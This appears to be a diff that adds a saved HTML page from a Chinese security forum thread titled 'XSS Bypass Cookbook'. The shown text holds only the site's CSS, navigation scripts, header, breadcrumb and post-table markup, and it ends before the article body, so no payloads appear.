+.regForm .ip div{padding:3px 3px 5px;*padding:4px 5px 4px;float:left;border:1px solid;border-color:#999 #ccc #ccc #999;}
+.regForm .ip div.current{background:#e0f9d0;}
+.regForm .ip div.hover,.regForm .ip div:hover{background:#fffbde;border:1px solid;border-color:#555 #aaa #aaa #555;}
+.regForm .ip input{border:0;padding:0;margin:0;font:14px/15px Arial;background:none;width:100%;padding-top:2px;width:222px;*width:218px; font-weight:700;color:#333;}
+.regForm .tp div{padding:5px 10px 5px 28px;width:230px;position:absolute;line-height:16px;}
+.regForm .tp .correct{border:0;background:url(images/register/regright.png) 6px 6px no-repeat;height:20px;}
+.regForm .tp .ignore{border:1px solid #e8e8e8;background:#f9f9f9 url(images/register/tp.png) 6px 6px no-repeat;color:#999;}
+.regForm .tp .wrong{border:1px solid #ebadb0;background:#fff2f5 url(images/register/regwrong.png) 6px 5px no-repeat;color:#b52726;padding-left:28px;}
+.regForm .tp img{vertical-align:middle;margin:5px 0 0 8px;}
+.regForm dd.ck input{width:50px}
+.regForm dd.ck div{margin-right:5px;}
+.regPre{margin:0 135px 10px 115px;}
+.regPre pre{border:1px solid;border-color:#999 #ccc #ccc #999;padding:5px 10px;line-height:1.5;color:#333;height:100px;overflow-x:hidden;overflow-y:scroll;}
+.regPre p{margin-bottom:5px;}
+/*关注*/
+.follow,.following{ background:url(u/images/follow.png) no-repeat;line-height:16px;}
+.follow{padding-left:16px; background-position:-4px -43px;_background-position:-4px -40px;}
+.following{padding-left:22px; background-position:-20px -22px;}
+/*全局颜色*/
+.s1{color:#f00;}/*red*/
+.s2{color:#f60;}/*org*/
+.s3{color:#7a0;}/*green*/
+.s4{color:#0066cc;}/*blue*/
+.s5{color:#333;}/*black*/
+.s6{color:#000;}/*black*/
+.s7{color:$68b;}/*min blue*/
+.gray{color:#999;}
+.gray2{color:#bbb;}
+ /*自定义css*/
+/*首页调用*/
+.w705{ width:705px;}
+.w220{ width:220px;}
+.w735{width:735px}
+.aliyun_text{width:320px;}
+.aliyun_hot{ border-bottom:1px dashed #d4d4d4;}
+.aliyun_hot dd{color:#999; line-height:21px; padding:4px 0 5px;}
+.aliyun_list{ line-height:28px; margin-top:6px;}
+.aliyun_list a{ color:#666;}
+.aliyun_list em a { color:#666;}
+.boxR{ border:1px solid #e8e8e8;}
+.boxR h5{ border-bottom:1px solid #e5e5e5; background:#f5f5f5; height:35px; line-height:35px; font-size:12px; color:#333; font-weight:700; text-indent:15px;}
+.boxR_dl{ border-bottom:1px solid #f1f1f1; margin:0 15px; padding:20px 0 15px; overflow:hidden;*zoom:1; color:#666; line-height:21px;}
+.boxR_dl dt{float:left; margin-right:10px;}
+.boxR_dl dt img{width:40px; height:40px;}
+.boxR_dl dd a{color:#666;}
+.boxR_img a{margin-bottom:15px; display:block;}
+.mt5{margin-top:5px;}
+.banzhu a{color:#999;}
+.icon-msg-show{
+	position:absolute;
+	width:20px;
+	height:20px;
+	-webkit-border-radius: 50%;
+	-moz-border-radius: 50%;
+	-ms-border-radius: 50%;
+	-o-border-radius: 50%;
+	border-radius: 50%;
+	background:#f60;
+	color:#fff;
+	top:-12px;
+	right:-7px;
+	display:block;
+	overflow:hidden;
+	text-align:center;
+	line-height:20px;
+	z-index:10
+
+}
+.aliyun_list_tuij{
+	padding:0 5px 6px 9px;
+	line-height:24px;
+}
+/*推荐板块样式*/
+.aliyun_tuij{
+	border:1px solid #e8e8e8;
+	border-top-width: 4px;
+}
+.aliyun_tuij .aliyun_tuij_in{
+	padding:8px 15px;
+	background:#fff;
+}
+.aliyun_tuij .aliyun_tuij_in h3{
+	font-weight:700;
+	font-size:14px;
+	padding-bottom:10px;
+	display:block;
+}
+.aliyun_tuij .aliyun_tuij_in ul li{
+	line-height:22px
+}
+.aliyun_tuij .aliyun_tuij_in a{
+	color:#666;
+}
+/*add by siwei*/
+.read-recommend{float:left;border-radius:4px;background-color:#f4f4f4;width:60px;text-align:center;padding:8px 0px;color:#999}
+
+</style><!--css-->
+<style>
+	html,body{
+		background-color:#fff;
+	}
+	.aisle{
+		pointer:cursor;
+	}
+	.hidden{
+		display:none;
+	}
+
+	a,a:link{
+		color:#333;
+	}
+	a:hover{
+		color:#00a2ca;
+	}
+	a.y-btn:link {
+		color: #fff;
+	}
+	a.y-btn-white:link {
+		color: #00a2ca;
+	}
+
+	.topbar-box { position: relative; height: 31px; background: #373D41; color: #fff; }
+	.topbar-box .w1200 { position: relative; }
+	.topbar-box .logo { position: relative; top: 5px; margin-right: 5px; color: #fff; }
+	.topbar-box .logo:hover { opacity: .8; text-decoration: none; }
+	.topbar-box .logo span { position: relative; top: -5px; }
+	.topbar-box .quick-link { position: absolute; top: 0; right: 0; height: 31px; line-height: 31px; }
+	.topbar-box .quick-link a { margin-left: 10px; color: #fff; }
+	.topbar-box .quick-link a:hover { opacity: .8; }
+	.topbar-box .user-info img { position: relative; top: 5px; width: 20px; border-radius: 20px; }
+	.topbar-box .user-info .username { margin-left: 5px; }
+
+	.header .nav { display: none; }
+	.header .slogo a { color: #00a1ca; }
+</style>
+
+<link rel="stylesheet" href="./XSS_Bypass_Cookbook_files/simplemde.min.css">
+<script type="text/javascript" language="JavaScript" src="./XSS_Bypass_Cookbook_files/core.js"></script><script src="./XSS_Bypass_Cookbook_files/Compatibility.js"></script><script src="./XSS_Bypass_Cookbook_files/zh_cn.js"></script>
+<script type="text/javascript" language="JavaScript" src="./XSS_Bypass_Cookbook_files/pw_ajax.js"></script>
+<script type="text/javascript" language="JavaScript" src="./XSS_Bypass_Cookbook_files/simplemde.min.js"></script>
+<script language="JavaScript">var imgpath = 'images';var verifyhash = '78a6f6c4aafd9a02';var modeimg = '';var modeBase = '';var winduid = '';var windid	= '';var groupid	= 'guest';var basename = '';var temp_basename = '';var db_shiftstyle = '1';var simplemde;var mdmode = true;var mding = false;
+function doBackWind(){
+    mding = false;
+    mdmode = false;
+    editor.setHTML(code2HTML('[markdown]'+simplemde.value()+'[/markdown]'));
+    B.css(B.$('.B_editor'),'display','block');
+    B.css(B.$('#mdtext'),'display','none');
+    editor.focus();
+}
+
+function code2HTML(str){
+    str = str.replace(/</g, '&lt;');
+    str = str.replace(/>/g, '&gt;');
+    return str.replace(/\n/g, '<br />');
+}
+
+</script>
+<script type="text/javascript" src="./XSS_Bypass_Cookbook_files/common.js"></script>
+<script type="text/javascript" src="./XSS_Bypass_Cookbook_files/Account.class.js"></script>
+
+
+</head>
+<body onkeydown="try{keyCodes(event);}catch(e){}" data-spm="bbsr536"><div id="pw_box" class="" style="position: absolute; left: 192px; z-index: 1011; visibility: visible; top: 3059px; display: none;"><div style="border:1px solid #ffffff;background:#f3f9fb;padding:5px 10px;"><p><span class="mr10">图片:3.png</span></p></div></div>
+<div class="topbar-box">
+	<div class="w1200">
+		<a href="https://xianzhi.aliyun.com/" class="logo">
+<img src="./XSS_Bypass_Cookbook_files/xz_logo.png">
+<span>先知（安全情报）</span>
+		</a>
+
+		<div class="quick-link">
+<a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Fread%2F536.html&amp;from_type=xianzhi">登录</a>
+		</div>
+
+
+
+	</div>
+</div>
+
+
+
+	<div class="header cc" data-spm="1">
+<div class="w1200">
+	<h2 class="slogo fl"><a href="https://xianzhi.aliyun.com/forum">安全技术社区</a></h2>
+<!--
+	<ul class="nav fr">-->
+<!-- <li><a href="index.php?m=bbs" >首页</a><i class="border"></i></li> -->
+<!-- <li><a href="fourms.php" >论坛</a><i class="border"></i></li> -->
+<!-- <li><a href="group.php" >群组</a><i class="border"></i></li> -->
+<!--	</ul>
+-->
+</div>
+	</div>
+	<!-- /header -->
+
+	<div class="search-wrap" data-spm="2">
+		<div class="w1200 cc">
+<div class="search-box fl">
+<form action="https://xianzhi.aliyun.com/forum/searcher.php" method="post" onsubmit="return searchInput();">
+	<input type="hidden" value="78a6f6c4aafd9a02" name="verify">
+	<input value="2" class="s_input" type="hidden" name="step">
+	<input value="thread" class="s_input" type="hidden" name="type" id="hiddenType">
+	<input class="search-txt" placeholder="搜索其实很简单！(^_^)" type="text" id="search_input" name="keyword">
+	<input class="submit-btn" type="submit" value="搜索">
+</form>
+</div>
+<!-- /主搜 -->
+<div class="unlogin-user-account-wrap fr">
+		<a class="aisle" id="aisle">我的快捷通道<i></i></a>
+	<div class="unlogin-popup hidden" id="unlogin-popup">
+		<p>您还没有登录，快捷通道只有在登录后才能使用。&nbsp;<a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Fread%2F536.html&amp;from_type=xianzhi">立即登录</a><br>还没有帐号？&nbsp;赶紧 <a href="https://account.aliyun.com/register/register.htm?oauth_callback=https%3A%2F%2Fxianzhi.aliyun.com%2Fforum%2Fread%2F536.html&amp;from_type=yundun-bbs">注册一个</a></p>
+	</div>
+</div>
+		</div>
+	</div>
+	<!-- /搜索 -->
+
+
+<script language="javascript">
+var timeoutSpecifyId = {};
+var navBStyle = '';
+var aisle = getObj('aisle');
+
+function tmpClose(elementId) {
+    timeoutSpecifyId[elementId] = setTimeout(function() {
+        getObj(elementId).style.display = 'none';
+    }, 100);
+}
+function tmpHideAllCross(currentSubMenuId,showNavB) {
+	if(!getObj('navB')) return;
+	if (showNavB) {
+		getObj('navB').style.display = '';
+	}
+    var elements = getElementsByClassName('navB', getObj('navB'));
+    if(elements.length){
+        for (i=0; i<elements.length; i++) {
+            if (elements[i].id != '' && elements[i].id != currentSubMenuId) elements[i].style.display = 'none';
+        }
+    }
+}
+
+function ctrlSubMenu(parentId, subMenuId) {
+    try {
+		clearTimeout(timeoutSpecifyId[subMenuId]);
+
+		tmpHideAllCross(subMenuId,true);
+		getObj(subMenuId).style.display = '';
+
+		getObj(parentId).onmouseout = function() {
+tmpClose(subMenuId);
+ timeoutSpecifyId[parentId] = setTimeout(function() {
+	if (navBStyle) {
+		getObj('navB').style.display = 'none';
+	}
+}, 100);
+getObj(parentId).onmouseout = '';
+		};
+		getObj(subMenuId).onmouseout = function() {
+tmpClose(subMenuId);
+if (navBStyle) {
+	getObj('navB').style.display = 'none';
+}
+		};
+		getObj(subMenuId).onmouseover = function() {
+clearTimeout(timeoutSpecifyId[subMenuId]);
+clearTimeout(timeoutSpecifyId[parentId]);
+getObj(subMenuId).style.display = '';
+getObj('navB').style.display = '';
+		};
+	}catch(e){}
+}
+
+var showToggle = function(eId){
+	var _ele = getObj(eId);
+	if(_ele){
+		_ele.style.display = _ele.style.display==="block"?"none":"block";
+	}
+};
+
+
+if(aisle){
+	var _currentEle,_timer,_currentFastObj;
+	if(''){
+		_currentEle = 'user-popup';
+	}else{
+		_currentEle = 'unlogin-popup';
+	}
+	_currentFastObj = getObj(_currentEle);
+	aisle.onclick = function(event){
+		 var e = event || window.event;
+	    if (e.stopPropagation){
+	        e.stopPropagation();
+	        e.preventDefault();
+	     }else{
+	    	e.cancelBubble = true;
+	    	e.returnValue = false;
+	    }
+	    showToggle(_currentEle);
+	};
+
+	aisle.onmouseover = function(){
+		clearTimeout(_timer);
+		_currentFastObj.style.display = "block";
+	};
+	aisle.onmouseout = function(){
+		_timer = setTimeout(function(){
+getObj(_currentEle).style.display = "none";
+		},100)
+	};
+	_currentFastObj.onmouseover = function(){
+		clearTimeout(_timer);
+		_currentFastObj.style.display = "block";
+	};
+	_currentFastObj.onmouseout = function(){
+		_timer = setTimeout(function(){
+_currentFastObj.style.display = "none";
+		},100)
+
+	};
+
+}
+
+
+
+</script>
+
+
+<div class="w1200">
+<style type="text/css">
+/*广播台*/
+.radio{height:140px;border:1px solid #a6cbe7;background:#fff url(images/bbsradio.png) left center no-repeat;min-width:800px;overflow:hidden;}
+.radioDl{padding:0 0 0 580px;margin:0;}
+.radioDl dt{margin:0 0 0 -540px;padding:0;}
+.radioDl dt .div{float:left;padding:13px 0 0 10px;}
+.radioDl dt .div p{ text-align:center;line-height:25px;}
+.radioUl {padding:7px 5px 0;}
+.radioUl li{line-height:24px;height:24px;font-size:12px;overflow:hidden;}
+.radioBg .view-hover,.radioBg .view-current{min-height:135px;_height:135px;}
+/*名片*/
+.card{border:1px solid #c0d8ea;width:433px;position:absolute;margin:-9px 0 0 -16px;background:#fff;-webkit-box-shadow:4px 4px 0 #e4e4e4;-moz-box-shadow:4px 4px 0 #e4e4e4;box-shadow:4px 4px 0 #e4e4e4;z-index:9;}
+.card a{color:#014c90;}
+.card dl{padding-right:10px;}
+.card dt{width:160px;overflow:hidden;}
+.card dt .face_img{margin:8px 15px;float:left;}
+.card dt p{padding-left:15px;}
+.card dd{width:260px;padding:5px 0;float:right;}
+.card dd li{height:23px;overflow:hidden;line-height:23px;}
+.card dd.ddA{border-bottom:1px dotted #ccc;}
+.card dd.ddA span{display:inline-block;width:60px;}
+.card dd.ddB{padding:10px 0;}
+.card dd.ddB a{padding-left:20px;margin-right:16px;}
+.half li{float:left;width:49.5%;}
+.face_img:hover{text-decoration:none;}
+.face_img img{width:120px;height:120px;}
+.floot_leftdiv .author{height:20px;line-height:20px;}
+.floot_leftdiv .author a{font-size: 14px;color: #00a2ca;display: block;float: left;height: 20px;width: 84px;overflow: hidden;}
+.readLevel{margin-top:15px;clear:both;}
+
+.floot_leftdiv .author img{margin-top:2px;margin-right:5px;display:block;float:left;}
+/*帖子结构*/
+.floot_leftdiv{overflow:hidden;}
+.floot_left{background:#FBFBFB;}
+.readCon_right{float:right;clear:right;padding-bottom:10px;margin-left:10px;}
+.tpc_content{/*float:left; clear:left;*/}
+.operTips{padding: 10px 0;
+margin: 0 0 10px;
+color: #666;
+text-align: center;
+background: #f1f6fa;
+border: 1px solid #e2eced;}
+/*帖子管理*/
+.readAdmin{border-top:1px solid #a6cbe7;padding:5px 0;}
+.readAdmin a{float:left;line-height:20px;height:20px;padding:0 10px;border:1px solid #a6cbe7;margin-right:5px;background:#fff;color:#666; cursor:pointer;}
+.readAdmin a:hover{ text-decoration:none;border:1px solid #de8a13;background:#fcfae3;color:#000;}
+/*楼层信息*/
+.readNum{overflow:hidden;background-color:#FBFBFB}
+.readNum ul{padding:7px 0;margin-left:-1px;width:160px;}
+.readNum li{float:left;width:64px;padding-left:15px;border-left:1px solid #d8e5ea;line-height:14px;}
+.readNum li em{display:block; font-weight:700;padding-bottom:3px;}
+/*楼层直达*/
+.readStairs{padding-top:5px;}
+.readStairs span{line-height:22px;}
+.readStairs .input{width:54px;height:26px;text-align:center;-webkit-border-radius:4px;-moz-border-radius: 4px;border-radius: 4px;background-color: #fff;-webkit-box-shadow: inset 0 2px #f2f2f2;-moz-box-shadow: inset 0 2px #f2f2f2;box-shadow: inset 0 2px #f2f2f2;border: solid 1px d4d4d4;padding:1px;vertical-align:top}
+.readStairs img{margin-top:5px;}
+/*用户信息*/
+.readName{ font:bold 12px/18px Arial;padding:10px 0 0 15px;margin-bottom:-5px;}
+.readHonor{color:#666;margin:0 0 5px;line-height:18px;width:128px;}
+.readFace img{line-height:1;display:block;border:1px solid #e4e4e4;padding:3px;background:#fff;margin-bottom:3px;}
+.readFace p img{border:0; display:inline;}
+.readLevel{line-height:25px;margin-bottom:15px}
+.readLevel img{display:block;}
+.readUser_info{margin-top:15px;}
+.readUser_info .one{padding:10px 0px 5px;}
+.readUser_info .one a{color:#666;}
+.readUser_info .one a:hover{border-bottom:1px solid #ccc;}
+.readUser_info dt{width:60px;float:left;margin-right:5px;}
+.readUser_info dd{float:left;width:70px;color:#666;}
+.readUser_info ul.two{line-height:18px;}
+.readUser_info ul.two li{float:left;width:49.5%;padding:2px 0;height:18px;}
+.readUser_info ul.two li a{display:block; text-indent:15px;}
+.add_mes{ background:url(images/post-icon.png) no-repeat 0 -396px;}
+.add_fol{ background:url(images/post-icon.png) no-repeat 0 -411px;}
+.add_adm{ background:url(images/pwicon/add_adm.png) no-repeat;}
+.add_gag{ background:url(images/pwicon/add_gag.png) no-repeat;}
+.add_fri{ background:url(images/pwicon/add_fri.png) no-repeat;}
+.add_pro{ background:url(images/pwicon/add_pro.png) no-repeat;}
+.add_home{ background:url(images/pwicon/add_home.png) no-repeat;}
+/*楼主留言*/
+.louMes{width:300px;background:#f7fbff;border-left:4px solid #e8f0f7;padding:10px;line-height:1.5;margin:20px 0; font-size:12px;}
+/*主楼用户操作*/
+.userOper{ text-align:center;margin:0 0 25px;}
+.userOper a{background:#f3f9fb url(images/post-icon.png) 8px 4px no-repeat;line-height:24px;height:24px;padding: 0 12px 0 30px;;
+display:inline-block;color:#fff;-moz-border-radius:3px;-webkit-border-radius:3px;margin:0 1px; font-family:Simsun;font-weight:700}
+.userOper a:hover{ text-decoration:none;background-color:#eaf4fc;}
+.userOper a.r_keep{ background-position:8px -227px;background-color: #f60;}
+.userOper a.r_score{ background-position:8px -255px;background-color: #00a2ca;}
+.userOper a.r_recommend{ background-position:8px -54px;}
+.userOper a.r_dig{ background-position:8px -155px;background-color: #57C4E9;}
+/*关联主题*/
+.related h4{display:block;padding:5px 0;border-bottom:1px dashed #e4e4e4;}
+.related ul{padding:10px 0;border-bottom:1px dashed #e4e4e4;}
+/*floot ad*/
+.flootbg{background:#E5E5E5;height:2px;}
+.flootbg div{overflow:hidden;}
+.flootbg div img{float:left;}
+/*图片列表*/
+.imgList{margin:10px 0;}
+.imgList h4{height:25px;padding:0 10px 0 30px;line-height:25px;background:#f3f9fb url(images/wind85/file/img.gif) 10px center no-repeat;;border-top:1px solid #a6cbe7;border-bottom:1px solid #d5e6ed;}
+.imgList h4 a{color:#014c90;margin:0 3px;}
+.imgList h4 a.current{color:#333; font-weight:700;}
+.imgList ul{padding-top:10px;}
+.imgList li{float:left;width:20%;padding:0 0 10px;height:125px;overflow:hidden;}
+.imgList .tac img{ width:120px;height:120px;}
+.imgList li img{ cursor:pointer;}
+.imgList ul.one li{float:none;width:auto;height:auto;}
+.forbid{padding-left:20px;background:#fff url(images/pwicon/forbid.png) 0 center no-repeat;line-height:20px;height:20px;display:inline-block;height:20px;position:absolute;right:0;_right:20px;top:0;color:#ff0000;}
+/*shareAll*/
+.shareAll{padding:0 12px;border:1px solid #d5e6ed;background:#F4F4F4;}
+.shareAll em{float:left;background:url(images/wind85/breadEm.png) right center no-repeat;padding:5px 18px 5px 0;}
+.shareAll a{float:left;margin:6px 0 0 8px;width:16px;height:16px;display:block;overflow:hidden; text-indent:-2000em;background:url(images/pwicon/shareAll.png) no-repeat;filter:alpha(opacity=80);-moz-opacity:0.8;opacity:0.8;}
+.shareAll a:hover{filter:alpha(opacity=100);-moz-opacity:1;opacity:1;}
+/*新幻灯片*/
+.pImg_wrap{position:absolute;z-index:1002;}
+.pImg{background:#ffffff;}
+.pImg_bg{position:absolute;background:#000;width:100%;height:100%;filter:alpha(opacity=50);-moz-opacity:0.5;opacity:0.5;left:0;right:0;top:0;bottom:0;z-index:1001;}
+.bcr1,.bcr2,.bcr3,.bcr4,.pibg1,.pibg2,.pibg3,.pibg4{overflow:hidden;z-index:1005;line-height:0 }
+.bcr1,.bcr2,.bcr3,.bcr4{width:5px;height:5px;background:url(images/search/pImg.png) no-repeat;}
+.pibg1,.pibg2,.pibg3,.pibg4{ background:#ffffff;}
+.pibg1{height:5px;}
+.pibg2{width:5px;}
+.pibg3{height:5px;}
+.pibg4{width:5px;}
+.bcr1{ background-position:0 0;}
+.bcr2{ background-position:-5px 0;}
+.bcr3{ background-position:-5px -5px;}
+.bcr4{ background-position:0 -5px;}
+.pImg_close{background:url(images/search/pImg_close.png);float:right;width:15px;height:15px;text-indent:-2000em;overflow:hidden;-webkit-transition: all 0.2s ease-out;margin:3px 0 0 0;display:inline;}
+.pImg_close:hover{background-position:0 -15px;}
+.imgLoading{overflow:hidden;position:relative;}
+.imgLoading img{display:block;width:100%;height:100%;}
+.aPre,.aNext{position:absolute;background:url(images/blank.gif);width:45%;padding-bottom:5000px;margin-bottom:-5000px;}
+.aPre{cursor:url(u/images/pre.cur),auto;}
+.aNext{cursor:url(u/images/next.cur),auto;right:0;}
+/*! wysiwyg.css v0.0.2 | MIT License | github.com/jgthms/wysiwyg.css */.wysiwyg{line-height:1.6}.wysiwyg a{text-decoration:none}.wysiwyg a:hover{border-bottom:1px solid}.wysiwyg abbr{border-bottom:1px dotted;cursor:help}.wysiwyg cite{font-style:italic}.wysiwyg hr{background:#e6e6e6;border:none;display:block;height:1px;margin-bottom:1.4em;margin-top:1.4em}.wysiwyg img{vertical-align:text-bottom}.wysiwyg ins{background-color:lime;text-decoration:none}.wysiwyg mark{background-color:#ff0}.wysiwyg small{font-size:0.8em}.wysiwyg strong{font-weight:700}.wysiwyg sub,.wysiwyg sup{font-size:0.8em}.wysiwyg sub{vertical-align:sub}.wysiwyg sup{vertical-align:super}.wysiwyg p,.wysiwyg dl,.wysiwyg ol,.wysiwyg ul,.wysiwyg blockquote,.wysiwyg pre,.wysiwyg table{margin-bottom:1.4em}.wysiwyg p:last-child,.wysiwyg dl:last-child,.wysiwyg ol:last-child,.wysiwyg ul:last-child,.wysiwyg blockquote:last-child,.wysiwyg pre:last-child,.wysiwyg table:last-child{margin-bottom:0}.wysiwyg p:empty{display:none}.wysiwyg h1,.wysiwyg h2,.wysiwyg h3,.wysiwyg h4,.wysiwyg h5,.wysiwyg h6{font-weight:700;line-height:1.2}.wysiwyg h1:first-child,.wysiwyg h2:first-child,.wysiwyg h3:first-child,.wysiwyg h4:first-child,.wysiwyg h5:first-child,.wysiwyg h6:first-child{margin-top:0}.wysiwyg h1{font-size:2.4em;margin-bottom:.58333em;margin-top:.58333em;line-height:1}.wysiwyg h2{font-size:1.6em;margin-bottom:.875em;margin-top:1.75em;line-height:1.1}.wysiwyg h3{font-size:1.3em;margin-bottom:1.07692em;margin-top:1.07692em}.wysiwyg h4{font-size:1.2em;margin-bottom:1.16667em;margin-top:1.16667em}.wysiwyg h5{font-size:1.1em;margin-bottom:1.27273em;margin-top:1.27273em}.wysiwyg h6{font-size:1em;margin-bottom:1.4em;margin-top:1.4em}.wysiwyg dd{margin-left:1.4em}.wysiwyg ol,.wysiwyg ul{list-style-position:outside;margin-left:1.4em}.wysiwyg ol{list-style-type:decimal}.wysiwyg ol ol{list-style-type:lower-alpha}.wysiwyg ol ol ol{list-style-type:lower-roman}.wysiwyg ol ol ol ol{list-style-type:lower-greek}.wysiwyg ol ol ol ol ol{list-style-type:decimal}.wysiwyg ol ol ol ol ol ol{list-style-type:lower-alpha}.wysiwyg ul{list-style-type:disc}.wysiwyg ul ul{list-style-type:circle}.wysiwyg ul ul ul{list-style-type:square}.wysiwyg ul ul ul ul{list-style-type:circle}.wysiwyg ul ul ul ul ul{list-style-type:disc}.wysiwyg ul ul ul ul ul ul{list-style-type:circle}.wysiwyg blockquote{border-left:4px solid #e6e6e6;padding:0.6em 1.2em}.wysiwyg blockquote p{margin-bottom:0}.wysiwyg code,.wysiwyg kbd,.wysiwyg samp,.wysiwyg pre{-moz-osx-font-smoothing:auto;-webkit-font-smoothing:auto;background-color:#f2f2f2;color:#333;font-size:0.9em}.wysiwyg code,.wysiwyg kbd,.wysiwyg samp{border-radius:3px;line-height:1.77778;padding:0.1em 0.4em 0.2em;vertical-align:baseline}.wysiwyg pre{overflow:auto;padding:1em 1.2em}.wysiwyg pre code{background:none;font-size:1em;line-height:1em}.wysiwyg figure{margin-bottom:2.8em;text-align:center}.wysiwyg figure:first-child{margin-top:0}.wysiwyg figure:last-child{margin-bottom:0}.wysiwyg figcaption{font-size:0.8em;margin-top:.875em}.wysiwyg table{width:100%}.wysiwyg table pre{white-space:pre-wrap}.wysiwyg th,.wysiwyg td{font-size:1em;padding:.7em;border:1px solid #e6e6e6;line-height:1.4}.wysiwyg thead tr,.wysiwyg tfoot tr{background-color:#f5f5f5}.wysiwyg thead th,.wysiwyg thead td,.wysiwyg tfoot th,.wysiwyg tfoot td{font-size:.9em;padding:.77778em}.wysiwyg thead th code,.wysiwyg thead td code,.wysiwyg tfoot th code,.wysiwyg tfoot td code{background-color:#fff}.wysiwyg tbody tr{background-color:#fff}
+
+/* add by yantu*/
+.read_h1{
+	position: relative;
+	overflow: hidden;
+	padding: 10px 0 10px 30px;
+	font-size: 14px;
+	font-weight: 700;
+	line-height: 32px;
+}
+
+
+
+.post_num,.coin_num{
+	margin-left:40px;
+}
+
+.star div {
+	height: 15px;
+	background: url(/images/star.png) repeat-x 0 0;
+}
+
+.links{padding-top: 15px;}
+
+.links a {
+	color: #666;
+	padding-left: 15px;
+	background: url(images/post-icon.png) no-repeat 0 -377px;
+}
+
+.links .add-follow-icon {
+	margin-right: 8px;
+	background-position: 1px -411px;
+}
+
+.links .write-letter-icon {
+	background-position: 0 -396px;
+}
+
+.floot_right{
+	padding: 10px 10px 15px 30px;
+	overflow: hidden;
+	border-left: 1px solid #efefef;
+}
+
+.menuList{
+	width:138px;
+}
+
+.tipTop{
+	margin:10px 0px;
+	padding-bottom:15px;
+	border-bottom: 1px dashed #e9e9e9;
+}
+
+.update-tips {
+	padding: 15px 150px 15px 10px;
+	margin-bottom: 30px;
+	border: 1px dashed #ccc;
+	background: #f7f7f7 url(/images/dere1.png) no-repeat right center;
+}
+
+.update-tips p {
+	font-size: 14px;
+	line-height: 24px;
+}
+
+.re-edit{
+	margin-bottom: 20px;
+	font-size: 12px;
+	color: #999;
+}
+
+.re-edit a {
+	color: #999;
+}
+
+
+
+</style><!--ads begin-->
+<!--[if IE]>
+<style type="text/css">
+.readUser_info .one dt{padding-top:1px;}
+</style>
+<![endif]-->
+<!--弹窗遮罩-->
+<!-- //start reply管理弹出 -->
+<div id="postbatch" style="display:none" class="popout">
+	<table cellspacing="0" cellpadding="0" border="0"><tbody><tr><td class="bgcorner1"></td><td class="pobg1"></td><td class="bgcorner2"></td></tr><tr><td class="pobg4"></td><td>
+		<div class="popoutContent">
+<div>
+	<div class="popTop" style="cursor:move;" onmousedown="read.move(event);">
+		<a href="javascript:void(0)" class="adel" onclick="closep()">关闭</a>
+		<span class="mr20">选中<span class="b s2" id="select_count">1</span>篇</span>
+	</div>
+	<div class="p10 cc">
+	</div>
+	<div class="popBottom cc">
+		<label class="fl"><input type="checkbox" onclick="replyManage.checkall(this);" value="" id="ajaxall" name="ajaxall">全选</label>
+	</div>
+</div>
+		</div>
+	</td><td class="pobg2"></td></tr><tr><td class="bgcorner4"></td><td class="pobg3"></td><td class="bgcorner3"></td></tr></tbody></table>
+</div>
+<!-- //end reply管理弹出 -->
+<!--广播台开始-->
+<!--面包屑-->
+<div id="breadCrumb" class="cc">
+	<ul class="fr">
+		<li><a href="https://xianzhi.aliyun.com/forum/searcher.php?sch_time=newatc" rel="nofollow">最新帖子</a></li>
+		<li><a href="https://xianzhi.aliyun.com/forum/searcher.php?digest=1" rel="nofollow">精华区</a></li>
+<li id="td_skin"><a href="javascript:;"><img src="./XSS_Bypass_Cookbook_files/style.gif" align="absmiddle" alt="论坛风格切换"></a></li>
+	</ul>
+	<img id="td_cate" src="./XSS_Bypass_Cookbook_files/home.gif" title="快速跳转至其他版块" onclick="return pwForumList(false,false,null,this);" class="cp breadHome"><em class="breadEm"></em><a href="https://xianzhi.aliyun.com/forum/fourms.php" title="安全技术社区">安全技术社区</a><em>&gt;</em><a href="https://xianzhi.aliyun.com/forum/thread/4.html">漏洞研究</a><em>&gt;</em><a href="https://xianzhi.aliyun.com/forum/read/536.html">【独家】XSS Bypass Cookbook</a>
+</div>
+<!--发帖 分页-->
+<div class="cc mb10">
+	<a href="https://xianzhi.aliyun.com/forum/post.php?fid=4" class="fr y-btn y-btn-white" id="td_post" title="发帖">发表主题</a>
+
+	<a href="https://xianzhi.aliyun.com/forum/post.php?action=reply&amp;fid=4&amp;tid=536" class="fr mr10 y-btn" rel="nofollow">回复主题</a>
+
+	<div class="fl"><span class="pages"><a href="https://xianzhi.aliyun.com/forum/thread/4.html" class="w">«&nbsp;返回列表</a></span><span class="fl"></span><span class="pages"><a href="https://xianzhi.aliyun.com/forum/link.php?action=previous&amp;fid=4&amp;tid=536&amp;fpage=0&amp;goto=previous" rel="nofollow">上一主题</a><a href="https://xianzhi.aliyun.com/forum/link.php?action=previous&amp;fid=4&amp;tid=536&amp;fpage=0&amp;goto=next" rel="nofollow">下一主题</a></span></div>
+</div>
+<div id="menu_post" class="pw_menu tac" style="display:none;">
+	<ul class="menuList" id="post_typeChoose">
+		<li><a href="https://xianzhi.aliyun.com/forum/post.php?fid=4" hidefocus="true" rel="nofollow">新帖</a></li>
+	</ul>
+</div>
+<!--帖子管理-->
+<!--帖子楼层开始-->
+<script type="text/javascript">
+var readFace = {
+	t1 : null,
+	t2 : null,
+	show : function(id) {this.t1 = setTimeout(function() {getObj(id).style.display = '';}, 400);},
+	clear : function() {clearTimeout(this.t1);},
+	close : function(id) {getObj(id).style.display = 'none';}
+}
+</script>
+<div id="pw_content" class="mb10">
+	<form name="delatc" method="post">
+	<input type="hidden" name="fid" value="4">
+	<input type="hidden" name="tid" id="tid" value="536">
+	<input type="hidden" name="hideUid" id="hideUid" value="">
+	<div class="readTop">
+		<table width="100%" style="table-layout:fixed;">
+<tbody><tr>
+	<td class="floot_left">
+		<div class="readNum">
+<ul class="cc">
+	<li><em>927</em>阅读</li>
+	<li><em>3</em>回复</li>
+</ul>
+		</div>
+	</td>
+	<td style="background:#fbfbfb"><h3 id="subject_tpc" class="read_h1"><a href="https://xianzhi.aliyun.com/thread/4.html?type=6" class="s5">[Web安全]</a>【独家】XSS Bypass Cookbook</h3></td>
+	<td width="110" class="readStairs" style="background:#fbfbfb;">
+	<input type="text" class="input mr5" name="floor" id="floor" onkeypress="if(event.keyCode == 13){getFloorUrl(this);return false;};">
